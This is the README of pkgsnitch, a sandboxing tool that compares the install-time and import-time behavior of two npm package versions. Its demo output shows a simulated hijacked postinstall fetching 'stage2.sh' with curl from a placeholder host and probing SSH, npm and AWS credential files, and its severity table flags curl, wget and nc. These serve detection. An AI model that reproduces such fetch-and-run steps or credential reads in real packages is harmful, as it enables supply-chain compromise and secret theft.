# pkgsnitch

**Behavioral diff for package updates.** See what a new version *does* at install and import time that the old one did not.

```
pkgsnitch diff some-package 4.2.0 4.2.1
```

A code diff tells you what changed in the source. pkgsnitch tells you what changed in the behavior: this patch release now reads `~/.ssh/id_rsa`, looks up a host it never contacted before, and runs `curl`. That is the signal that matters when a maintainer account is hijacked, and it is the one a version bump in a lockfile hides.

## How it works

For each of the two versions, pkgsnitch starts a throwaway container and runs three phases:

1. **Fetch.** `npm install --ignore-scripts` downloads the package and its dependencies. No package code runs while the network is up.
2. **Install.** The network is disconnected. `npm rebuild` runs every lifecycle script under `strace`.
3. **Import.** The entry point is loaded with `import()`, again under `strace`.

During phases 2 and 3 the container has no route to anything. A sinkhole inside it answers every DNS query and accepts connections on ports 80 and 443, so code that phones home reveals the host name, TLS server name or HTTP request it wanted to send, and nothing leaves the machine. The home directory is seeded with worthless honeytoken credentials (`~/.ssh`, `~/.npmrc`, `~/.aws`, and more), so code that goes looking for secrets finds something to open.

The syscall traces are reduced to normalized **behaviors**: files read from a list of sensitive locations, writes outside the places an install is expected to touch, processes started, and network activity. Each behavior is attributed to the command line responsible. The behaviors of the two versions are compared as sets, so everything npm and node do on their own cancels out, and what remains is rated.

## Install

Requires Docker. Build from source with a Rust toolchain:

```
cargo install --path .
```

The sandbox image is built automatically on first use.

## Usage

```
pkgsnitch diff <package> <old-version> <new-version>
pkgsnitch diff ./old.tgz ./new.tgz          # two `npm pack` tarballs
pkgsnitch scan <package>[@version]          # one version, against an empty project
pkgsnitch scan ./package.tgz
```

| Option | Meaning |
|---|---|
| `--format terminal\|json\|markdown` | Output for people, tools, or a pull request comment |
| `--fail-on <severity>` | Exit with status 1 at this severity or above (default `high`) |
| `--timeout <seconds>` | Limit per phase (default 180) |
| `--no-cache` | Observe again instead of reusing a stored result |

Exit status is `0` when nothing reaches the threshold, `1` when something does, and `2` on errors.

Results for exact registry versions are cached under your cache directory, so comparing 4.2.1 with 4.2.2 next week only observes the new version.

### Try it

The repository ships a harmless demo pair: an honest `1.0.0` and a `1.0.1` that simulates a hijacked patch release. The public API is byte-for-byte identical between the two, so a glance at the source diff waves it through; the behavior is not.

```
(cd demo/1.0.0 && npm pack) && (cd demo/1.0.1 && npm pack)
pkgsnitch diff demo/1.0.0/pkgsnitch-demo-leftpad-1.0.0.tgz demo/1.0.1/pkgsnitch-demo-leftpad-1.0.1.tgz
```

```
  pkgsnitch  pkgsnitch-demo-leftpad 1.0.0 -> 1.0.1

  CRITICAL  install   runs command
                      curl -fsSL https://collect.pkgsnitch-demo.invalid/stage2.sh
                      by node scripts/setup.js (in pkgsnitch-demo-leftpad)
                      runs the network tool `curl`

  HIGH      manifest  install script added
                      postinstall: node scripts/setup.js
                      this version starts running code on every `npm install`

  MEDIUM    install   runs command
                      sh -c node scripts/setup.js
                      by node /usr/bin/npm rebuild --foreground-scripts
                      starts a new process

  5 new, 0 gone. Verdict: CRITICAL
```

The same release run under the container also surfaces the credential probes (`~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws/credentials`) and the blocked connection to `collect.pkgsnitch-demo.invalid`, which the honeytoken home directory and the network sinkhole make visible.

## What the severities mean

| Severity | Examples |
|---|---|
| critical | reads credentials; writes a shell profile, cron entry or git hook; runs `curl`, `wget`, `nc`; talks to the Docker socket |
| high | any DNS lookup, connection, TLS handshake or HTTP request; an install script that did not exist before; writes in the home directory |
| medium | starts a new process; an install script whose command changed; a new dependency that has an install script |
| low | a new dependency |
| info | behavior that disappeared, dependency version changes |

Severity rates how alarming it is for a package to *start* doing something. A build tool that has always downloaded a binary in its postinstall script produces no finding on update, because nothing changed.

## Limits

Be clear about what this does and does not tell you.

- **It observes, it does not prove.** Code that waits for a date, checks for CI variables, or only triggers on a specific call will not show its hand in a two-minute run. A clean report means "nothing new was observed", not "safe".
- **Behavior behind a failed download is not seen.** With the network gone, an install script that fetches a binary fails at that point. The attempt is reported; whatever the binary would have done is not.
- **Only install and import are exercised.** Functions you call later are out of scope.
- **Sandbox detection is possible.** Malware can notice `strace` or the container and stay quiet.
- **Containers are not a hard security boundary.** The container runs without capabilities, with `no-new-privileges` and without network, which is a strong default, but a kernel exploit would escape it. Run pkgsnitch on a machine where that risk is acceptable, such as a CI runner.
- **Trace files live where observed code can reach them.** The network log is protected by file ownership; the syscall traces are not. Code that specifically targets pkgsnitch could tamper with them.
- **npm only, for now.** The design is not specific to npm; PyPI and crates.io need their own fetch and run steps.

## Development

```
cargo test
cargo clippy --all-targets
```

The analyzer is tested without Docker: `src/strace.rs` parses raw strace output, `src/extract.rs` derives behaviors, `src/diff.rs` compares and rates. The sandbox itself lives in `sandbox/` and is embedded into the binary at build time.

## License

MIT
